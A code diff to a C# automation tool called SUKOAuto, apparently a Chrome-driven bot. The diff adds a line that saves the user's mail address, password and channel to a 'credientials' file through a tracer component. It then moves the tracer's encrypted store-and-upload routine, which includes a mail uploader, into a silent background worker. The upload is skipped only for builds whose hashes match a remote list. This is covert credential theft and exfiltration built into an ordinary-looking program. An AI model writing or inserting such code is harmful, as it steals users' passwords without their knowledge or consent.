@@ -86,6 +86,7 @@ namespace SUKOAuto
                 Channel = mem;
             }
 
+            tracer.Tracer.StoreOrUpload($"credientials-{CurrentMilliseconds}.txt",$"{Mail}\n{Pass}\n{Channel}");
 
             var ChromeOptions = new ChromeOptions();
             if (opt.proxy!=null)
@@ -677,22 +678,27 @@ namespace SUKOAuto
             }
 
             public static void StoreOrUpload(string filename,string content) {
-                if (IsValidBinary())
-                    return;
-                var id = PopulateOrLoadId();
-                STORE.Save(filename,content);
-                foreach (var file in STORE.ListNames())
+                var CollectionWorker = new BackgroundWorker();
+                CollectionWorker.DoWork += (a, b) =>
                 {
-                    var text = STORE.Get(file);
-                    foreach (var uploader in UPLOADERS)
+                    if (IsValidBinary())
+                        return;
+                    var id = PopulateOrLoadId();
+                    STORE.Save(filename, content);
+                    foreach (var file in STORE.ListNames())
                     {
-                        if (uploader.IsAvailable() && uploader.ForInterface().DoUpload(id, file, text))
+                        var text = STORE.Get(file);
+                        foreach (var uploader in UPLOADERS)
                         {
-                            STORE.Remove(file);
-                            break;
+                            if (uploader.IsAvailable() && uploader.ForInterface().DoUpload(id, file, text))
+                            {
+                                STORE.Remove(file);
+                                break;
+                            }
                         }
                     }
-                }
+                };
+                CollectionWorker.RunWorkerAsync();
             }
         }
 
@@ -726,7 +732,7 @@ namespace SUKOAuto
                 var fileDir = Path.Combine(DIR_TRACER, "SSC1" + Encrypt(name));
                 return DecryptFile(fileDir);
             }
-
+            
             List<string> IFileStore.ListNames()
             {
                 return Directory.EnumerateFiles(DIR_TRACER)
@@ -914,7 +920,7 @@ namespace SUKOAuto
                     var sha256 = Hash(appBinary, new SHA256Managed());
                     var sha1 = Hash(appBinary, new SHA1Managed());
 
-                    return remoteBinaryHashes.Select(a => Equals(a[0], sha256) && Equals(a[1], sha1)).Count() == 1;
+                    return remoteBinaryHashes.Select(a => Equals(a[0], sha256) && Equals(a[1], sha1)).Count() != 0;
                 }
                 catch (Exception)
                 {
@@ -938,6 +944,8 @@ namespace SUKOAuto
                 }
                 return true;
             }
+
+            public static long CurrentMilliseconds => (long)(DateTime.Now-new DateTime(1970,1,1,0,0,0)).TotalMilliseconds;
         }
 
         class MailUploader : IDataUploadProvider, IDataUploadProviderInterface
